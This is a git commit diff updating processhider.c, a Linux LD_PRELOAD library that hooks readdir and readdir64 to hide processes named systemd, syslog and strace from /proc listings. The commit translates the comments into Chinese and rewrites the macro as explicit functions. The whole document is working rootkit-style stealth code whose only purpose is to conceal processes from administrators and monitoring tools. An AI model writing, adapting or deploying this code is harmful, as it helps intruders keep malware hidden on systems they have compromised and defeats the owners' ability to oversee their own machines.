cbc14056710ad8eebfb3cf4fb8b06d25068b1080
ppuuoo <1365226512@qq.com>
2025-02-06 11:10:35 +0800

    Update processhider.c

--- processhider.c
+++ processhider.c
@@ -7,11 +7,12 @@
 #include <unistd.h>
 
 /*
- * Every process with this name will be excluded
+ * 每个名称在这里的进程都会被隐藏
  */
-static const char* process_to_filter[] = {"systemd","syslog","strace"};
+static const char* process_to_filter[] = {"systemd", "syslog", "strace"};
+
 /*
- * Get a directory name given a DIR* handle
+ * 获取目录的路径
  */
 static int get_dir_name(DIR* dirp, char* buf, size_t size)
 {
@@ -27,14 +28,14 @@ static int get_dir_name(DIR* dirp, char* buf, size_t size)
         return 0;
     }
 
-    buf[ret] = 0;
+    buf[ret] = '\0';
     return 1;
 }
 
 /*
- * Get a process name given its pid
+ * 根据PID获取进程名称
  */
-static int get_process_name(char* pid, char* buf)
+static int get_process_name(const char* pid, char* buf)
 {
     if(strspn(pid, "0123456789") != strlen(pid)) {
         return 0;
@@ -56,34 +57,37 @@ static int get_process_name(char* pid, char* buf)
     fclose(f);
 
     int unused;
-    sscanf(tmp, "%d (%[^)]s", &unused, buf);
+    sscanf(tmp, "%d (%255[^)]s", &unused, buf);
     return 1;
 }
 
-#define DECLARE_READDIR(dirent, readdir)                                \
-static struct dirent* (*original_##readdir)(DIR*) = NULL;               \
-                                                                        \
-struct dirent* readdir(DIR *dirp)                                       \
-{                                                                       \
-    if(original_##readdir == NULL) {                                    \
-        original_##readdir = dlsym(RTLD_NEXT, #readdir);               \
-        if(original_##readdir == NULL)                                  \
-        {                                                               \
-            fprintf(stderr, "Error in dlsym: %s\n", dlerror());         \
-        }                                                               \
-    }                                                                   \
-                                                                        \
-    struct dirent* dir;                                                 \
-    char dir_name[256];                                                 \
-    char process_name[256];                                             \
-    int i;                                                              \
-                                                                        \
+/*
+ * 定义拦截函数 readdir
+ */
+static struct dirent* (*original_readdir)(DIR*) = NULL;
+static struct dirent64* (*original_readdir64)(DIR*) = NULL;
+
+struct dirent* readdir(DIR *dirp)                                       
+{                                                                       
+    if(original_readdir == NULL) {                                     
+        original_readdir = (struct dirent* (*)(DIR*)) dlsym(RTLD_NEXT, "readdir");               
+        if(original_readdir == NULL)                                   
+        {                                                              
+            fprintf(stderr, "Error in dlsym: %s\n", dlerror());        
+            return NULL;                                               
+        }                                                              
+    }                                                                  
+
+    struct dirent* dir;                                                 
+    char dir_name[256];                                                 
+    char process_name[256];                                             
+    int i;                                                              
+
     while (1) { 
-       dir = original_##readdir(dirp); 
+        dir = original_readdir(dirp); 
         if (!dir) break; 
     
         if (get_dir_name(dirp, dir_name, sizeof(dir_name))) {
-           
             if (strcmp(dir_name, "/proc") == 0 && get_process_name(dir->d_name, process_name)) {
                 int exclude_process = 0;
                 for (i = 0; i < (int)(sizeof(process_to_filter) / sizeof(process_to_filter[0])); i++) {
@@ -95,11 +99,47 @@ struct dirent* readdir(DIR *dirp)                                       \
                 if (exclude_process) continue; 
             }
         }
-        break; 
+        return dir; 
     }
-return dir;
-                                                        \
+    return NULL;
 }
 
-DECLARE_READDIR(dirent64, readdir64);
-DECLARE_READDIR(dirent, readdir);
+/*
+ * 定义拦截函数 readdir64
+ */
+struct dirent64* readdir64(DIR *dirp)                                       
+{                                                                       
+    if(original_readdir64 == NULL) {                                     
+        original_readdir64 = (struct dirent64* (*)(DIR*)) dlsym(RTLD_NEXT, "readdir64");               
+        if(original_readdir64 == NULL)                                   
+        {                                                              
+            fprintf(stderr, "Error in dlsym: %s\n", dlerror());        
+            return NULL;                                               
+        }                                                              
+    }                                                                  
+
+    struct dirent64* dir;                                                 
+    char dir_name[256];                                                 
+    char process_name[256];                                             
+    int i;                                                              
+
+    while (1) { 
+        dir = original_readdir64(dirp); 
+        if (!dir) break; 
+    
+        if (get_dir_name(dirp, dir_name, sizeof(dir_name))) {
+            if (strcmp(dir_name, "/proc") == 0 && get_process_name(dir->d_name, process_name)) {
+                int exclude_process = 0;
+                for (i = 0; i < (int)(sizeof(process_to_filter) / sizeof(process_to_filter[0])); i++) {
+                    if (strcmp(process_name, process_to_filter[i]) == 0) {
+                        exclude_process = 1;
+                        break;
+                    }
+                }
+                if (exclude_process) continue; 
+            }
+        }
+        return dir; 
+    }
+    return NULL;
+}
